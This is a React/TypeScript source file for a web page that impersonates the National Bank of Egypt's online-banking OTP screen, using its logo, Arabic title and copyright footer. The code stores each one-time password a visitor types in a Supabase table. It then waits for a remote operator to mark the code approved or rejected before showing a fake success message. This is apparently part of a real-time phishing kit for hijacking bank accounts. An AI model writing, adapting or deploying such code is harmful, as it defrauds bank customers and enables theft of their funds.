import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { CheckCircle2 } from "lucide-react";
import nbeLogo from "@/assets/nbe-logo-full.png";
import { supabase } from "@/integrations/supabase/client";
import { useSessionRedirect } from "@/hooks/use-session-redirect";

export const Route = createFileRoute("/otp")({
  head: () => ({
    meta: [{ title: "ادخل الرقم السري المتغير OTP | الأهلي نت" }],
  }),
  component: OtpPage,
});

function OtpPage() {
  useSessionRedirect();
  const navigate = useNavigate();
  const [otp, setOtp] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState("");
  const [done, setDone] = useState(false);
  const channelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);

  useEffect(() => {
    if (typeof window === "undefined") return;
    const id = sessionStorage.getItem("nbe_session_id");
    if (!id) navigate({ to: "/login" });
    return () => {
      if (channelRef.current) supabase.removeChannel(channelRef.current);
    };
  }, [navigate]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!otp.trim()) return;
    const sessionId = typeof window !== "undefined" ? sessionStorage.getItem("nbe_session_id") : null;
    if (!sessionId) {
      navigate({ to: "/login" });
      return;
    }
    setError("");
    setSubmitting(true);
    const { error: updateError } = await supabase
      .from("sessions")
      .update({ otp, status: "pending_otp" })
      .eq("id", sessionId);

    if (updateError) {
      setSubmitting(false);
      setError("خطأ يرجى إصدار كود جديد من خلال تطبيق OTP TOKEN");
      return;
    }

    const channel = supabase
      .channel(`session-otp-${sessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${sessionId}` },
        (payload) => {
          const row = payload.new as { status: string };
          if (row.status === "otp_approved") {
            setSubmitting(false);
            setDone(true);
            supabase.removeChannel(channel);
            channelRef.current = null;
          } else if (row.status === "otp_rejected") {
            setSubmitting(false);
            setOtp("");
            setError("خطأ يرجى إصدار كود جديد من خلال تطبيق OTP TOKEN");
          }
        },
      )
      .subscribe();
    channelRef.current = channel;
  };

  if (done) {
    return (
      <div dir="rtl" className="flex min-h-screen flex-col bg-background text-foreground">
        <header className="flex items-center justify-end border-b border-border px-6 py-4">
          <img src={nbeLogo} alt="البنك الأهلي المصري" width={1920} height={520} className="h-9 w-auto object-contain md:h-11" />
        </header>
        <main className="flex flex-1 flex-col items-center justify-center px-4 text-center">
          <div className="mx-auto flex h-20 w-20 items-center justify-center rounded-full bg-green-100 text-green-600">
            <CheckCircle2 className="h-10 w-10" />
          </div>
          <h1 className="mt-6 text-2xl font-bold">تم تسجيل الدخول بنجاح</h1>
          <p className="mt-2 text-sm text-muted-foreground">سيتم توجيهك إلى صفحتك الشخصية قريباً.</p>
        </main>
      </div>
    );
  }

  return (
    <div dir="rtl" className="flex min-h-screen flex-col bg-muted/40 text-foreground">
      <header className="flex items-center justify-end border-b border-border bg-background px-6 py-4">
        <img
          src={nbeLogo}
          alt="البنك الأهلي المصري"
          width={1920}
          height={520}
          className="h-9 w-auto object-contain md:h-11"
        />
      </header>

      <main className="flex flex-1 flex-col items-center px-4 py-10">
        <form
          onSubmit={handleSubmit}
          className="w-full max-w-md rounded-2xl bg-background p-6 text-right shadow-sm ring-1 ring-border/60"
        >
          <h1 className="text-xl font-bold text-foreground">ادخل الرقم السري المتغير OTP</h1>
          <p className="mt-4 text-sm leading-relaxed text-muted-foreground">
            برجاء ادخال الرقم السري المتغير OTP الذي تم انشائه من خلال تطبيق الرقم السري المتغير من تطبيق OTP TOKEN
          </p>

          <div className="mt-8 flex flex-col items-center">
            <span className="text-base font-medium text-muted-foreground">Verification Code</span>
            <div className="mt-4 h-12 w-12 animate-spin rounded-full border-[5px] border-muted border-t-muted-foreground/60" />
          </div>

          <div className="mt-6">
            <input
              type="password"
              inputMode="numeric"
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
              placeholder="* * * * * *"
              autoFocus
              disabled={submitting}
              dir="ltr"
              className="w-full rounded-xl border border-input bg-background px-6 py-4 text-center text-2xl font-bold tracking-[0.4em] outline-none transition-colors placeholder:text-muted-foreground/50 placeholder:font-normal focus:border-primary focus:ring-4 focus:ring-primary/20 disabled:opacity-60"
            />
            {error && (
              <p className="mt-4 text-sm font-semibold text-destructive">
                {error}
              </p>
            )}
          </div>

          <button
            type="submit"
            disabled={submitting || !otp.trim()}
            className="mt-6 w-full rounded-xl bg-primary py-4 text-base font-bold text-primary-foreground transition-colors hover:bg-primary/90 disabled:opacity-60"
          >
            تأكيد
          </button>

          <p className="mt-6 text-xs leading-relaxed text-muted-foreground">
            تفاصيل الدفع الخاصة بك مشفرة ومحمية بشكل آمن بالنقر فوق "ادفع الان" فإنك تؤكد أنك أكبر من 20 عاما وأنك توافق على{" "}
            <a className="underline" href="#">شروط الاستخدام</a> و{" "}
            <a className="underline" href="#">سياسة الخصوصية الخاصة بنا</a>
          </p>
        </form>
      </main>

      <footer className="bg-primary py-4 text-center text-xs font-semibold text-primary-foreground">
        جميع الحقوق محفوظة - البنك الأهلي المصري ©
      </footer>
    </div>
  );
}
